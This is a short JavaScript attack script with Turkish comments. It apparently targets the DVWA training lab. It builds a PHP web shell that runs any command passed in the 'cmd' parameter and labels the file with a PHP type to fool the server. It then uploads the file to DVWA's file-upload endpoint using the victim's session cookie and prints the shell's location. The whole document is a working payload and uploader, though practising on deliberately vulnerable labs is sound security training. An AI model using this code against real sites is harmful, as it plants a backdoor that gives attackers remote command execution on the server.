// 1. Basit bir PHP Backdoor oluşturuyoruz (Payload)
// Bu kod: ?cmd=adresine gelen komutu çalıştırır.
var shellCode = "<?php system($_GET['cmd']); ?>";

// 2. Bu kodu bir dosya (Blob) nesnesine çeviriyoruz
// type: 'application/x-php' yaparak sunucuyu kandırıyoruz
var blob = new Blob([shellCode], { type: 'application/x-php' });

// 3. Form verisi hazırlıyoruz (Sanki kullanıcı dosya seçmiş gibi)
var formData = new FormData();
formData.append('uploaded', blob, 'shell.php'); // DVWA input adı: 'uploaded'
formData.append('Upload', 'Upload'); // Butona basma simülasyonu

// 4. Hedef URL'yi "GÖRELİ" (Relative) veriyoruz.
// ÖNEMLİ: Başında http://IP YOK! Sadece klasör yolu var.
var targetUrl = '/dvwa/vulnerabilities/upload/upload.php';

// 5. İsteği gönderiyoruz
var xhr = new XMLHttpRequest();
xhr.open('POST', targetUrl, true);
xhr.withCredentials = true; // Cookie (Oturum) bilgisini eklemezsek admin yetkisi olmaz!

xhr.onload = function () {
    if (xhr.status === 200) {
        // İsteğin başarılı olup olmadığını anlamak için response içine bakıyoruz
        if (xhr.responseText.includes("succesfully uploaded")) {
            console.warn("+++ SHELL YÜKLENDİ! +++");
            console.warn("Adres: /dvwa/hackable/uploads/shell.php");
            // Opsiyonel: Başarılı olursa kullanıcıya alert ver (test için)
            // alert("Pwned! Shell Yüklendi."); 
        } else {
            console.log("Upload isteği gitti ama sunucu hata döndü (Dosya boyutu veya tipi engellendi).");
        }
    } else {
        console.log("Bağlantı hatası: " + xhr.status);
    }
};

xhr.send(formData);
